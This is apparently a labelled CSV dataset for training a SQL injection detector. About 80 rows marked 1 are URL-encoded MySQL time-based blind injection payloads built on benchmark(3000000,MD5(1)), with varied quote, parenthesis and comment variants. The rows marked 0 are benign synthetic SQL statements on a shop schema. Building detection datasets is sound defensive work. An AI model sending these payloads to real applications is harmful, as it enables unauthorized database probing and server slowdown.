Sentence,Label
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23",1
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*",1
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--",1
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23",1
"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*",1
"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--",1
"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23",1
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*",1
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--",1
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23",1
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*",1
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--",1
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23",1
"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*",1
"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--",1
"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23",1
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*",1
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--",1
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23",1
",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*",1
",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--",1
",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23",1
"',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*",1
"',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--",1
"',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23",1
""",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*",1
""",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--",1
""",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23",1
"),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*",1
"),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--",1
"),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23",1
"'),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*",1
"'),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--",1
"'),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23",1
"""),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*",1
"""),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--",1
"""),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23",1
"and 0=benchmark(3000000,MD5(1))%20/*",1
"and 0=benchmark(3000000,MD5(1))%20--",1
"and 0=benchmark(3000000,MD5(1))%20%23",1
"' and 0=benchmark(3000000,MD5(1))%20/*",1
"' and 0=benchmark(3000000,MD5(1))%20--",1
"' and 0=benchmark(3000000,MD5(1))%20%23",1
""" and 0=benchmark(3000000,MD5(1))%20/*",1
""" and 0=benchmark(3000000,MD5(1))%20--",1
""" and 0=benchmark(3000000,MD5(1))%20%23",1
") and 0=benchmark(3000000,MD5(1))%20/*",1
") and 0=benchmark(3000000,MD5(1))%20--",1
") and 0=benchmark(3000000,MD5(1))%20%23",1
")) and 0=benchmark(3000000,MD5(1))%20/*",1
")) and 0=benchmark(3000000,MD5(1))%20--",1
")) and 0=benchmark(3000000,MD5(1))%20%23",1
"))) and 0=benchmark(3000000,MD5(1))%20/*",1
"))) and 0=benchmark(3000000,MD5(1))%20--",1
"))) and 0=benchmark(3000000,MD5(1))%20%23",1
")))) and 0=benchmark(3000000,MD5(1))%20/*",1
")))) and 0=benchmark(3000000,MD5(1))%20--",1
")))) and 0=benchmark(3000000,MD5(1))%20%23",1
"') and 0=benchmark(3000000,MD5(1))%20/*",1
"') and 0=benchmark(3000000,MD5(1))%20--",1
"') and 0=benchmark(3000000,MD5(1))%20%23",1
""") and 0=benchmark(3000000,MD5(1))%20/*",1
""") and 0=benchmark(3000000,MD5(1))%20--",1
""") and 0=benchmark(3000000,MD5(1))%20%23",1
"')) and 0=benchmark(3000000,MD5(1))%20/*",1
"')) and 0=benchmark(3000000,MD5(1))%20--",1
"')) and 0=benchmark(3000000,MD5(1))%20%23",1
""")) and 0=benchmark(3000000,MD5(1))%20/*",1
""")) and 0=benchmark(3000000,MD5(1))%20--",1
""")) and 0=benchmark(3000000,MD5(1))%20%23",1
"'))) and 0=benchmark(3000000,MD5(1))%20/*",1
"'))) and 0=benchmark(3000000,MD5(1))%20--",1
"'))) and 0=benchmark(3000000,MD5(1))%20%23",1
"""))) and 0=benchmark(3000000,MD5(1))%20/*",1
"""))) and 0=benchmark(3000000,MD5(1))%20--",1
"""))) and 0=benchmark(3000000,MD5(1))%20%23",1
"')))) and 0=benchmark(3000000,MD5(1))%20/*",1
"')))) and 0=benchmark(3000000,MD5(1))%20--",1
"')))) and 0=benchmark(3000000,MD5(1))%20%23",1
""")))) and 0=benchmark(3000000,MD5(1))%20/*",1
""")))) and 0=benchmark(3000000,MD5(1))%20--",1
""")))) and 0=benchmark(3000000,MD5(1))%20%23",1
"INSERT INTO categories (category_id, category_name) VALUES (1946, 'Febjyrosiime');",0
SELECT * FROM orders WHERE order_date > '2022-02-15' ORDER BY user_id ASC LIMIT 63;,0
"SELECT total_amount, order_date, user_id FROM orders WHERE order_date > '2022-10-09' ORDER BY total_amount ASC;",0
"INSERT INTO categories (category_id, category_name) VALUES (5089, 'Wmqycpjrebhu');",0
SELECT category_name FROM categories ORDER BY category_name DESC;,0
SELECT username FROM users WHERE email = 'nilakhcj@mghch.com' LIMIT 81;,0
"SELECT price_per_unit, quantity, order_detail_id FROM order_details WHERE order_detail_id < 2806 ORDER BY price_per_unit DESC;",0
"INSERT INTO products (stock_quantity, price) VALUES (31, 304.90);",0
"SELECT total_amount, order_id, status, order_date FROM orders WHERE order_date > '2022-12-24';",0
SELECT * FROM users LIMIT 51;,0
"SELECT price, product_id FROM products ORDER BY stock_quantity ASC LIMIT 27;",0
SELECT * FROM users WHERE password_hash > 'mzuwpuxddbeoifuegzvxlhcqncjaukttkzbzdywh';,0
"UPDATE products SET product_id = 7463, price = 77.08, category_id = 5934 WHERE stock_quantity = 10;",0
"SELECT category_name, category_id FROM categories WHERE category_id = 1661;",0
"SELECT total_amount, status FROM orders ORDER BY order_id ASC LIMIT 16;",0
SELECT * FROM products WHERE price > 465.53 ORDER BY price ASC;,0
"UPDATE users SET password_hash = 'ngjnzmtarywdadvazbxjspggxedxsnuysdixcpla', user_id = 9031 WHERE email = 'ffajdwqw@olbxy.com';",0
"INSERT INTO orders (status, order_date, user_id) VALUES ('2022-08-31', '2022-07-18', 5719);",0
"INSERT INTO products (product_id, price, product_name) VALUES (7796, 295.60, 'Kumbugstwria');",0
"UPDATE categories SET category_name = 'Lojrmmgnmiyn', category_id = 2533 WHERE category_id = 3978;",0
UPDATE users SET user_id = 7505 WHERE last_login = 'nemodpmupmamyll';,0
"UPDATE orders SET order_id = 8715, order_date = '2022-09-16' WHERE user_id = 9447;",0
SELECT product_id FROM order_details ORDER BY quantity DESC;,0
"SELECT order_id, user_id, order_date, status FROM orders WHERE order_id < 1079;",0
"INSERT INTO categories (category_id, category_name) VALUES (3425, 'Uzjiefkggnqa');",0
"SELECT order_id, product_id FROM order_details WHERE quantity > 89 ORDER BY product_id ASC;",0
"SELECT category_id, category_name FROM categories ORDER BY category_name ASC LIMIT 96;",0
DELETE FROM categories WHERE category_id = 7607;,0
SELECT category_name FROM categories;,0
"UPDATE order_details SET order_detail_id = 2936, quantity = 1, price_per_unit = 467.07 WHERE order_id = 8762;",0
"UPDATE order_details SET product_id = 9009, order_detail_id = 4235, quantity = 61 WHERE price_per_unit = 89.23;",0
UPDATE categories SET category_name = 'Trxovemhkhnu' WHERE category_id = 1724;,0
"INSERT INTO orders (user_id, status) VALUES (7740, '2022-06-18');",0
"UPDATE users SET created_at = '2022-08-31', password_hash = 'jpephajkqtnmcsyqzoiapnhvrkmkpyjmiumclbnx' WHERE password_hash = 'ilfuufkmwvlvonobnwglrwghjpxmsryfddgeyxfm';",0
"SELECT category_name, category_id FROM categories ORDER BY category_name ASC;",0
"SELECT price, product_name, product_id FROM products WHERE category_id = 1113 ORDER BY stock_quantity ASC LIMIT 95;",0
"SELECT last_login, created_at, password_hash FROM users WHERE email != 'nnryaetx@kdfrt.com' ORDER BY username ASC LIMIT 41;",0
"SELECT order_date, order_id, total_amount, status FROM orders ORDER BY user_id DESC LIMIT 28;",0
DELETE FROM order_details WHERE product_id = 4933;,0
DELETE FROM orders WHERE total_amount = 239.92;,0
UPDATE order_details SET order_id = 3275 WHERE quantity = 71;,0
"SELECT order_id, order_detail_id, price_per_unit, product_id FROM order_details ORDER BY order_detail_id ASC;",0
SELECT order_date FROM orders ORDER BY user_id ASC;,0
"UPDATE categories SET category_name = 'Aomwgbdttalr', category_id = 3507 WHERE category_id = 1039;",0
"INSERT INTO products (category_id, price) VALUES (9008, 306.20);",0
"SELECT category_id, category_name FROM categories WHERE category_id != 3091 LIMIT 22;",0
"SELECT product_name, price, description FROM products WHERE stock_quantity < 40 ORDER BY stock_quantity DESC;",0
"INSERT INTO categories (category_id, category_name) VALUES (4198, 'Wyvzlwmupmvn');",0
"INSERT INTO order_details (order_detail_id, product_id) VALUES (9081, 467);",0
SELECT order_detail_id FROM order_details WHERE product_id < 8456;,0
"SELECT stock_quantity, product_name FROM products WHERE stock_quantity > 41;",0
DELETE FROM categories WHERE category_id = 2718;,0
"SELECT product_id, description FROM products WHERE category_id < 1475 LIMIT 70;",0
"SELECT price_per_unit, product_id, order_detail_id FROM order_details WHERE price_per_unit < 109.86 LIMIT 87;",0
"SELECT quantity, product_id FROM order_details WHERE order_id != 4303 ORDER BY price_per_unit DESC;",0
"INSERT INTO orders (order_date, total_amount, order_id, status) VALUES ('2022-08-19', 67.35, 9241, '2022-09-12');",0
"SELECT price_per_unit, quantity, order_id FROM order_details;",0
"SELECT category_name, category_id FROM categories ORDER BY category_id DESC;",0
"SELECT email, last_login, username, password_hash FROM users WHERE username != 'Gtlyfvwumryw' ORDER BY email DESC;",0
"SELECT stock_quantity, product_name, price FROM products WHERE stock_quantity != 43 ORDER BY product_name ASC;",0
SELECT * FROM products WHERE product_id < 8036 ORDER BY product_name DESC LIMIT 38;,0
UPDATE order_details SET order_detail_id = 3017 WHERE price_per_unit = 162.93;,0
"SELECT price_per_unit, order_id FROM order_details WHERE price_per_unit < 19.33 ORDER BY product_id DESC;",0
"SELECT category_name, category_id FROM categories WHERE category_name = 'Onrkldvyyuvy' ORDER BY category_name ASC LIMIT 73;",0
"SELECT price, product_name FROM products WHERE product_name = 'Trxtxngrqchc' ORDER BY product_id ASC;",0
SELECT * FROM orders LIMIT 17;,0
"SELECT product_name, description, price, product_id FROM products WHERE stock_quantity > 49 ORDER BY product_name ASC LIMIT 98;",0
SELECT category_id FROM categories WHERE category_id = 3281 LIMIT 12;,0
DELETE FROM orders WHERE status = '2022-08-24';,0
DELETE FROM categories WHERE category_id = 5768;,0
"SELECT quantity, order_detail_id FROM order_details WHERE price_per_unit < 458.79 ORDER BY product_id DESC;",0
UPDATE order_details SET product_id = 2944 WHERE quantity = 5;,0
"UPDATE categories SET category_id = 2490, category_name = 'Sftgpgbakaek' WHERE category_id = 9920;",0
DELETE FROM orders WHERE user_id = 5677;,0
"INSERT INTO categories (category_name, category_id) VALUES ('Cdespdnyyyxu', 6593);",0
"SELECT quantity, product_id FROM order_details WHERE order_id != 9936 ORDER BY quantity ASC LIMIT 97;",0
"INSERT INTO users (created_at, user_id, last_login) VALUES ('2022-03-10', 4432, 'fzfyspmhqqomikd');",0
"SELECT description, product_name, category_id FROM products;",0
UPDATE categories SET category_name = 'Uzitfrbczgwt' WHERE category_name = 'Izmhkutmpxri';,0
"SELECT order_id, quantity FROM order_details LIMIT 34;",0
"INSERT INTO products (category_id, price) VALUES (2461, 426.21);",0
"SELECT category_id, category_name FROM categories WHERE category_name = 'Bkjmyqbhqldr';",0
"INSERT INTO users (last_login, created_at) VALUES ('rimqadcildupbwa', '2022-06-17');",0
"SELECT category_id, category_name FROM categories WHERE category_id = 6187 ORDER BY category_name ASC LIMIT 41;",0
"SELECT password_hash, username, last_login, created_at FROM users;",0
"SELECT order_id, price_per_unit, quantity, order_detail_id FROM order_details WHERE price_per_unit > 13.66 LIMIT 18;",0
UPDATE orders SET user_id = 7910 WHERE status = '2022-10-18';,0
SELECT * FROM order_details ORDER BY quantity ASC;,0
"SELECT quantity, order_id, order_detail_id, product_id FROM order_details WHERE order_id != 4032 ORDER BY quantity ASC;",0
"INSERT INTO products (description, product_id) VALUES ('xhnwnggztxajqpk', 4675);",0
UPDATE categories SET category_name = 'Axjpmyqevdbl' WHERE category_name = 'Zbnjcvaskhoi';,0
SELECT category_id FROM categories WHERE category_id = 9562 ORDER BY category_name ASC;,0
SELECT status FROM orders WHERE status > '2022-12-31';,0
"SELECT price, product_id, product_name, stock_quantity FROM products WHERE description != 'nltfnqgfzvfsblh' LIMIT 58;",0
"INSERT INTO users (password_hash, last_login, created_at) VALUES ('yducpqnfsldmvldqemlqpqrgddfcsmsmqcxlqnsy', 'kbhdvxizwdwlvyr', '2022-06-27');",0
SELECT * FROM users ORDER BY user_id ASC;,0
"SELECT user_id, order_date, status FROM orders WHERE order_id > 1368 ORDER BY order_date ASC;",0
"SELECT total_amount, user_id, order_date, order_id FROM orders ORDER BY order_id DESC;",0
SELECT email FROM users WHERE user_id = 1807 ORDER BY password_hash ASC LIMIT 56;,0
DELETE FROM categories WHERE category_name = 'Wrqfubompjif';,0
DELETE FROM products WHERE product_id = 929;,0
"SELECT category_name, category_id FROM categories WHERE category_id < 8333 ORDER BY category_name DESC;",0
"SELECT stock_quantity, product_name, price, category_id FROM products ORDER BY price DESC;",0
"UPDATE categories SET category_id = 389, category_name = 'Jlfubkivtgtr' WHERE category_id = 1876;",0
UPDATE order_details SET quantity = 43 WHERE order_id = 7695;,0
"SELECT total_amount, order_date FROM orders WHERE order_id < 8842 ORDER BY total_amount ASC LIMIT 71;",0
SELECT category_id FROM categories WHERE category_name < 'Rsdtjlpbwsfp' ORDER BY category_id DESC;,0
UPDATE order_details SET price_per_unit = 379.60 WHERE product_id = 4111;,0
"INSERT INTO orders (order_date, user_id, total_amount, status) VALUES ('2022-01-17', 2540, 152.14, '2022-02-14');",0
DELETE FROM users WHERE password_hash = 'xfrcgsywjsimnrpkoenqxdpnctqprmtdrfcwqkll';,0
"INSERT INTO users (password_hash, email) VALUES ('wyhirnfokicwrpectrhfsmqmmfvvfjdphuulcdyc', 'rghyrada@bftsj.com');",0
"INSERT INTO order_details (price_per_unit, product_id, order_id) VALUES (112.00, 819, 5407);",0
DELETE FROM orders WHERE order_date = '2022-12-31';,0
DELETE FROM categories WHERE category_id = 6691;,0
"SELECT category_id, product_name, price, product_id FROM products WHERE price = 394.48 ORDER BY product_name DESC;",0
DELETE FROM categories WHERE category_id = 4394;,0
"SELECT category_id, category_name FROM categories WHERE category_name != 'Gcaowgepmgqr' ORDER BY category_id ASC LIMIT 14;",0
"INSERT INTO orders (order_id, status, user_id) VALUES (2472, '2022-07-21', 2400);",0
DELETE FROM categories WHERE category_id = 2849;,0
"SELECT category_name, category_id FROM categories WHERE category_id < 9138 ORDER BY category_id ASC LIMIT 17;",0
"SELECT category_id, category_name FROM categories WHERE category_name = 'Vwrgpaveokmg' LIMIT 28;",0
"UPDATE order_details SET order_id = 2098, product_id = 7633, quantity = 49 WHERE product_id = 9037;",0
"SELECT order_date, order_id, total_amount FROM orders WHERE total_amount = 218.85 LIMIT 51;",0
"INSERT INTO orders (total_amount, order_id, user_id, status) VALUES (37.72, 557, 3827, '2022-10-30');",0
"SELECT created_at, password_hash FROM users WHERE username > 'Ccmoqovgujaw' ORDER BY username DESC LIMIT 82;",0
UPDATE products SET category_id = 3064 WHERE product_id = 2635;,0
"SELECT category_id, category_name FROM categories WHERE category_id > 4003;",0
"UPDATE order_details SET price_per_unit = 59.71, quantity = 42 WHERE product_id = 7907;",0
"UPDATE orders SET status = '2022-08-28', total_amount = 425.98 WHERE total_amount = 327.36;",0
UPDATE orders SET user_id = 6710 WHERE user_id = 9475;,0
UPDATE users SET created_at = '2022-08-14' WHERE password_hash = 'ciltktfsanrteevsuctqqysdmfyffnwenhggajdf';,0
UPDATE products SET price = 225.26 WHERE price = 437.92;,0
"SELECT category_id, category_name FROM categories WHERE category_name = 'Qibzqrqkciwr' ORDER BY category_id DESC;",0
"SELECT price, category_id, description, product_name FROM products ORDER BY price DESC;",0
SELECT * FROM orders WHERE order_date != '2022-05-03';,0
"SELECT status, user_id, order_id, total_amount FROM orders;",0
"SELECT category_id, category_name FROM categories WHERE category_name = 'Azwjyijzvzeh' ORDER BY category_id DESC;",0
"SELECT last_login, user_id FROM users WHERE last_login < 'lvdmzonobpkrwoe';",0
DELETE FROM order_details WHERE order_id = 8367;,0
"SELECT status, user_id, order_id, total_amount FROM orders WHERE status != '2022-10-17' LIMIT 76;",0
"INSERT INTO users (email, last_login, password_hash, user_id) VALUES ('wziwvhkj@bvsop.com', 'vzkfqhfnqgffrwu', 'mbwemgfdoifvwulzigqufrjbumobnwofqyrmbuld', 4518);",0
"INSERT INTO order_details (order_id, quantity) VALUES (9752, 21);",0
"SELECT order_detail_id, product_id, price_per_unit FROM order_details WHERE price_per_unit > 378.21;",0
SELECT product_id FROM products LIMIT 68;,0
"UPDATE products SET product_name = 'Hyohuuycwuzj', price = 16.70 WHERE description = 'nhkscbfikkaqfee';",0
"INSERT INTO orders (total_amount, order_date, status, order_id) VALUES (308.73, '2022-03-18', '2022-05-11', 8118);",0
"SELECT category_name, category_id FROM categories WHERE category_id != 1132 LIMIT 11;",0
"SELECT total_amount, status, order_date FROM orders WHERE order_date = '2022-07-29';",0
"SELECT category_name, category_id FROM categories WHERE category_name > 'Zyflwgnjhhok' LIMIT 28;",0
"UPDATE products SET price = 63.62, category_id = 3816 WHERE product_name = 'Gunxtfphrwlc';",0
SELECT product_id FROM products LIMIT 41;,0
"UPDATE orders SET user_id = 1285, total_amount = 329.57 WHERE order_date = '2022-10-18';",0
"SELECT quantity, order_id FROM order_details LIMIT 77;",0
SELECT password_hash FROM users WHERE created_at > '2022-09-25' ORDER BY created_at DESC LIMIT 90;,0
"SELECT category_name, category_id FROM categories;",0
"SELECT category_id, category_name FROM categories WHERE category_id > 1715;",0
UPDATE products SET category_id = 2387 WHERE stock_quantity = 45;,0
"UPDATE orders SET total_amount = 73.76, order_date = '2022-12-03' WHERE user_id = 969;",0
"UPDATE categories SET category_id = 9607, category_name = 'Kcfbjonauudl' WHERE category_id = 5586;",0
"SELECT product_id, quantity, order_id FROM order_details ORDER BY order_detail_id ASC LIMIT 46;",0
DELETE FROM orders WHERE status = '2022-09-09';,0
"INSERT INTO users (username, created_at, password_hash) VALUES ('Rsoykbhgljzr', '2022-02-28', 'ygylpeaqhmvgdlbpvslvpwycexblzziwbecxpogy');",0
SELECT category_id FROM categories WHERE category_id > 4741 LIMIT 49;,0
"UPDATE order_details SET product_id = 2829, price_per_unit = 457.13, order_id = 802 WHERE order_id = 4460;",0
DELETE FROM orders WHERE user_id = 3746;,0
SELECT * FROM products WHERE product_name = 'Xupawtrrnukc';,0
"UPDATE categories SET category_id = 1412, category_name = 'Rbczjcnlzkwu' WHERE category_id = 5812;",0
DELETE FROM users WHERE email = 'ecacufez@hqsiq.com';,0
UPDATE products SET product_id = 2079 WHERE product_id = 1598;,0
"INSERT INTO orders (user_id, status, order_id) VALUES (6150, '2022-06-06', 7706);",0
"SELECT product_name, price, product_id, category_id FROM products ORDER BY product_id DESC LIMIT 42;",0
UPDATE orders SET status = '2022-08-15' WHERE total_amount = 370.00;,0
SELECT price FROM products;,0
SELECT order_detail_id FROM order_details WHERE order_id = 405;,0
"SELECT last_login, password_hash FROM users LIMIT 62;",0
SELECT * FROM order_details WHERE order_detail_id < 3337 LIMIT 96;,0
"SELECT order_id, product_id, quantity FROM order_details;",0
UPDATE orders SET order_id = 3388 WHERE status = '2022-07-26';,0
"UPDATE users SET email = 'meamjqsk@hjqcs.com', username = 'Yizquihsfeeg' WHERE email = 'tlwvkhnf@gytmw.com';",0
"SELECT order_date, status, order_id, total_amount FROM orders WHERE total_amount != 250.78;",0
"SELECT quantity, order_id FROM order_details WHERE quantity != 64 ORDER BY quantity DESC LIMIT 27;",0
UPDATE categories SET category_name = 'Ipwemzkywjln' WHERE category_name = 'Lyzylhjjcdtg';,0
SELECT * FROM orders WHERE user_id != 374 ORDER BY order_date DESC;,0
DELETE FROM categories WHERE category_name = 'Jabqiqzvbqxj';,0
"SELECT username, email FROM users;",0
DELETE FROM users WHERE username = 'Smnzfsuftjqz';,0
"SELECT order_detail_id, product_id FROM order_details WHERE quantity < 28 ORDER BY product_id ASC;",0
SELECT category_id FROM categories WHERE category_name = 'Zutxzzheaikc';,0
"UPDATE categories SET category_name = 'Lgiinwdcglvi', category_id = 4744 WHERE category_id = 9545;",0
"UPDATE orders SET status = '2022-04-17', user_id = 7043 WHERE order_date = '2022-12-12';",0
"SELECT email, created_at, password_hash, last_login FROM users WHERE email != 'isbpxohu@xxjmo.com' ORDER BY username ASC LIMIT 97;",0
SELECT product_name FROM products WHERE stock_quantity < 96;,0
SELECT description FROM products;,0
"SELECT last_login, email, username, password_hash FROM users LIMIT 84;",0
"INSERT INTO users (user_id, created_at, last_login, password_hash) VALUES (3147, '2022-07-30', 'irmkrhghxbchpvj', 'dzxituvscnglemdjzqezaafbkjdufxwdectmldwb');",0
SELECT * FROM orders WHERE order_date > '2022-08-27' ORDER BY status DESC LIMIT 81;,0
UPDATE products SET stock_quantity = 43 WHERE price = 244.00;,0
"INSERT INTO categories (category_id, category_name) VALUES (3037, 'Vdrxacuxqihx');",0
DELETE FROM users WHERE username = 'Eopcvexmcupq';,0
DELETE FROM order_details WHERE product_id = 9882;,0
"SELECT category_name, category_id FROM categories WHERE category_id != 6818;",0
"SELECT product_id, stock_quantity, category_id FROM products WHERE description > 'heiieedwffjbvjj';",0
"SELECT total_amount, status, user_id, order_id FROM orders WHERE order_date = '2022-12-30' LIMIT 79;",0
"SELECT stock_quantity, product_id, product_name, price FROM products WHERE product_name != 'Khdmdzmgbtze' ORDER BY description ASC;",0
SELECT * FROM categories WHERE category_name = 'Isjsiagfvboq' LIMIT 79;,0
"SELECT order_id, status, user_id, total_amount FROM orders WHERE order_date > '2022-01-14' ORDER BY total_amount ASC;",0
"SELECT category_id, price FROM products;",0
"INSERT INTO users (created_at, last_login) VALUES ('2022-04-13', 'wcgvauefpoaohba');",0
SELECT product_name FROM products WHERE product_name > 'Kapwbqidexaz' LIMIT 79;,0
